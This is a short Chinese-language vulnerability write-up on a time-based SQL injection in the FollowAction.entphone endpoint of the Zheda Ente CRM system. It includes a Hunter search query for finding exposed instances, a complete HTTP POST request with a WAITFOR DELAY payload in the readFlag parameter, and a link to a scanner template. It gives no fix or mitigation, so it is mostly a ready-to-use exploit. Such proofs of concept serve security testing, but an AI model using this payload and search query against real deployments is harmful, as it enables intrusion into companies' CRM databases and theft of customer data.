# 浙大恩特CRM FollowAction存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM FollowAction存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感数据。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="浙大恩特 CRM"`
+ 特征

![1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a.png](./img/m19IpcWC3G3B53u5/1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a-838671.png)

# 四、漏洞复现
```plain
POST /entsoft/FollowAction.entphone;.js HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Length: 72
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:3%27--
```

![1708235641244-6376c3c0-87fe-47a6-bad0-3b0b2f987767.png](./img/m19IpcWC3G3B53u5/1708235641244-6376c3c0-87fe-47a6-bad0-3b0b2f987767-860254.png)

[浙大恩特客户资源管理系统-followaction-entphone--sql注入.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222145263-d49b26ed-4e41-4352-b174-82a892d4332e.yaml)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zm2llrx2u25ytzk3>